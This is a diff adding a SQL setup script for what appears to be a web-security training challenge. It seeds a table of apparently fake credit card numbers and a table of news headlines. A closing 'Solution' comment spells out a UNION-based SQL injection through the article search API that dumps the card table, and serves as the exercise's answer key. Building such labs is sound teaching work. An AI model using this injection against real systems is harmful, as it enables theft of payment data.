@@ -1,0 +1,66 @@
+
+Create Database "CCdb";
+
+\c "CCdb";
+
+CREATE TABLE customer_cc(
+                   CreditCardID int,
+                   CustomerID text,
+                   CardType TEXT,
+                   CardNumber TEXT,
+                   ExpMonth text,
+                   ExpYear text);
+
+insert into customer_cc values(1,1,'Amex','364032732536639',8,2019);
+                insert into customer_cc values(2,800,'Visa','4294026220324109',1,2024);
+                insert into customer_cc values(3,1100,'Visa','4778053891831662',4,2022);
+                insert into customer_cc values(4,1150,'Visa','4461395664903034',12,2021);
+                insert into customer_cc values(5,1038,'Mastercard','5226304523028440',10,2023);
+                insert into customer_cc values(6,600,'Mastercard','5275764580711305',9,2024);
+                insert into customer_cc values(7,1039,'Discover','6011132071221795',5,2023);
+                insert into customer_cc values(8,1149,'Discover','6011382687509857',3,2026);
+                insert into customer_cc values(9,1050,'Visa','4202879322437752',2,2025);
+                insert into customer_cc values(10,800,'Amex','358146250739033',11,2022);
+                insert into customer_cc values(11,2,'Amex','358146250739033',11,2022);
+
+CREATE TABLE article(
+            id int,
+            author text,
+            created_date text,
+            article_headline text,
+            permalink text,
+            published text
+            );
+
+insert into article values(1,'Neo','1-30-2020','CEO Kenneth Sullivan to leave Smithfield Foods','cdo-sullivan','t');            
+insert into article values(2,'Neo','29-2020','Resilient performance prompts Barclays to upgrade AGCO and Lincoln Electric','resilient-electric','t');           
+insert into article values(3,'Neo','3-28-2020','NiSource wins BofA bullish boost as unique gas utility play','boa-bullish','t');          
+insert into article values(4,'Neo','4-27-2020','Bell Media names Oosterman new leader for 2021','bell-media','t');         
+insert into article values(5,'Neo','5-26-2020','Delta cautious on travel bridge to Europe timeline','delta-cautious','t');        
+insert into article values(6,'Neo','6-25-2020','Atossa advances study of COVID-19 nasal spray','atossa-advances','t');            
+insert into article values(7,'Neo','7-24-2020','Stocks dip into the red as investors wait on stimulus deal','stocks-dip','t');            
+insert into article values(8,'Neo','8-23-2020','Blue Hat inks cooperation agreements with six China-based kindergartens','blue-hat-china','t');            
+insert into article values(9,'Neo','8-22-2020','Edesa receives FDA approval to initiate Covid studies in the US','edessa-receives','t');            
+insert into article values(10,'Neo','10-21-2020','Credit Suisse lifts New Residential target price on operating profit growth','suisse-lifts','t');            
+insert into article values(11,'Neo','11-20-2020','Canadian Solar to energy storage system to Mustang solar project','canadian-solar','t');
+
+/* Solution
+1. Append union of information_schema query to end of api query (columns and types must match the top query of the union)
+   SELECT * FROM ARTICLE WHERE lower(article_headline) like lower('%media%25') union select 1,table_name,'','','','' from information_schema.tables --
+   Explanation:
+   [The  %25') term in at the end of the url completes the first query and sets up for a second query using union. 
+    A % symbol cannot be issued on the url as its reserved, so must use the encoded form]
+   [The Union select statement allows direct query to the database.]
+   [The -- comments the end of the query.]
+2. from this, discern that the customer_cc table would be the target to search
+3. append union to return table
+   Union SELECT * FROM customer_cc 
+4. copy the results to excel or R
+5. line chart or plot the firt two columns.
+
+URLs:s
+{webroot}/sign-up.html
+{webroot}/article-search.html
+{webroot}/api/Article/5
+
+*/
